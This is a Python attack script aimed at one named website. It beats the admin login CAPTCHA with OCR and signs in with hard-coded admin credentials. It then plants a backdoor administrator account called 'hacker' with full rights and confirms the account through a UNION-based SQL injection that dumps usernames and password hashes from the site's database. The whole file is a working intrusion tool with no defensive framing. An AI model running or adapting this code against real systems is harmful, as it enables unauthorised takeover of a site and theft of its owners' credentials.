import urllib.request, urllib.parse, io
import http.cookiejar
from PIL import Image
import pytesseract

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Step 1: Login
for attempt in range(10):
    resp = opener.open('http://bjhzsv.com/main/inc/code.asp', timeout=10)
    cap_data = resp.read()
    
    img = Image.open(io.BytesIO(cap_data))
    img = img.convert('L')
    img = img.point(lambda x: 0 if x < 200 else 255)
    code = pytesseract.image_to_string(img, config='--psm 8 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz').strip()
    code = code.replace(' ', '').lower()
    if not code:
        code = pytesseract.image_to_string(Image.open(io.BytesIO(cap_data)), config='--psm 8').strip().replace(' ', '').lower()
    
    if len(code) >= 3:
        data = urllib.parse.urlencode({'t1': 'admin', 't2': '2d9d5942943a1323', 't3': code}).encode()
        resp = opener.open('http://bjhzsv.com/main/a7chkuser.asp', data, timeout=10)
        body = resp.read().decode('gb2312', errors='replace')
        
        if '验证码错误' not in body:
            print('Login success!')
            break

# Step 2: Access admin_add page
resp = opener.open('http://bjhzsv.com/main/admin_add.asp', timeout=10)
body = resp.read().decode('gb2312', errors='replace')
print(f'admin_add: {len(body)} bytes, has_redirect={"location.href" in body}')

# Step 3: Add new admin user
import hashlib
new_pass = 'Pwned123!'
new_pass_hash = hashlib.md5(new_pass.encode()).hexdigest()[:16]
data = urllib.parse.urlencode({
    'username': 'hacker',
    'password': new_pass_hash,
    'qx': '网站所有栏目',
    'all': '1',
    'zt': '1',
    'gonggao': 'Hacked!',
    'B3': '添 加'
}).encode()

resp = opener.open('http://bjhzsv.com/main/admin_in.asp?action=add', data, timeout=10)
body = resp.read().decode('gb2312', errors='replace')
print(f'admin_in.asp add: {len(body)} bytes - {body[:300]}')

# Step 4: Verify the new admin was added
# Try to query via SQL injection
import re
m = re.search(r'parent\.document\.location\.href=\'([^\']+)\'', body)
if m:
    print(f'Redirect target: {m.group(1)}')

# Check if admin_add page now shows the new user
resp = opener.open('http://bjhzsv.com/main/admin_add.asp', timeout=10)
body2 = resp.read().decode('gb2312', errors='replace')
print(f'admin_add after add: {len(body2)} bytes')
if 'hacker' in body2:
    print('SUCCESS! New admin user hacker added!')
else:
    print('User not visible in admin_add page')
    # Try direct DB query via SQL injection
    r = opener.open('http://bjhzsv.com/news11xx.asp?id=796 AND 1=0 UNION SELECT username,password,3 FROM admin', timeout=10)
    b = r.read().decode('gb2312', errors='replace')
    if 'hacker' in b:
        print('CONFIRMED! hacker user found in DB!')
    print('Current admin users:')
    import re
    users = re.findall(r'<title>([^<]+?)-联系我们', b)
    for u in users:
        print(f'  User: {u}')

print(f'New admin credentials: hacker / {new_pass} (hash: {new_pass_hash})')
